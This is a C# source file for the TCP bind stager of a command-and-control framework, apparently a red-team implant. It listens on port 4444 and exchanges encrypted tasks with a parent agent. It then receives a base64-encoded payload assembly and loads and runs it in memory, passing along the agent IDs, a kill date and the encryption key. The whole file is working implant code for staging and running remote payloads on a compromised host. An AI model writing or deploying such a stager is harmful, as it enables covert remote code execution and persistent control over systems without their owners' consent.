using Shared.Models;
using Shared.Utilities;

using Stager.Comms;
using Stager.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Stager
{
    public class Stager
    {
        static string AgentID;
        static string ParentAgentID;

        static CommModule CommModule;
        static StagerModule StagerModule;

        static bool Staged = false;

        public delegate void StagerCommand(AgentTask Task);

        public Stager()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Stager();
        }

        public static void Execute()
        {
            AgentID = Utilities.GetRandomString(6);

            StagerModule = new StagerModule
            {
                Commands = new List<StagerModule.StagerCommand>
                {
                    new StagerModule.StagerCommand
                    {
                        Name = "Link0Request",
                        Delegate = Link0Response
                    },
                    new StagerModule.StagerCommand
                    {
                        Name = "StageResponse",
                        Delegate = StageResponse
                    }
                }
            };

            CommModule = new TCPCommModule(BindAddress, BindPort);
            CommModule.Start();

            while (!Staged)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    var task = Crypto.Decrypt<AgentTask>(Message.Data, Message.IV);

                    var callback = StagerModule.Commands
                        .FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase))
                        .Delegate;

                    callback?.Invoke(task);
                }
            }
        }

        static void Link0Response(AgentTask Task)
        {
            var placeholder = (string)Task.Parameters["Placeholder"];
            ParentAgentID = (string)Task.Parameters["ParentAgentID"];

            var task = Crypto.Encrypt(
                new AgentTask
                {
                    Module = "Link",
                    Command = "Link0Response",
                    Parameters = new Dictionary<string, object>
                    {
                        { "Placeholder", placeholder },
                        { "AgentID", AgentID }
                    }
                },
                out byte[] iv);

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = ParentAgentID,
                    Data = task,
                    IV = iv
                });

            Thread.Sleep(5000);

            SendStage0();
        }

        static void SendStage0()
        {
            var c2Data = Crypto.Encrypt(
                new C2Data
                {
                    Module = "Core",
                    Command = "StageRequest",
                    Data = Encoding.UTF8.GetBytes(ParentAgentID)
                },
                out byte[] iv);

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = AgentID,
                    Data = c2Data,
                    IV = iv
                });
        }

        static void StageResponse(AgentTask Task)
        {
            CommModule.Stop();
            Staged = true;

            var bytes = Convert.FromBase64String((string)Task.Parameters["Stage"]);
            var asm = Assembly.Load(bytes);

            asm.GetType("Agent.Stage").GetMethod("TCPEntry").Invoke(null, new object[]
            {
                AgentID,
                ParentAgentID,
                KillDate,
                BindAddress,
                BindPort,
                Crypto.EncryptionKey
            });
        }

        static string BindAddress
        {
            get { return "0.0.0.0"; }
        }

        static int BindPort
        {
            get { return 4444; }
        }

        static DateTime KillDate
        {
            get { return DateTime.Parse("01/01/2030 00:00:01"); }
        }
    }
}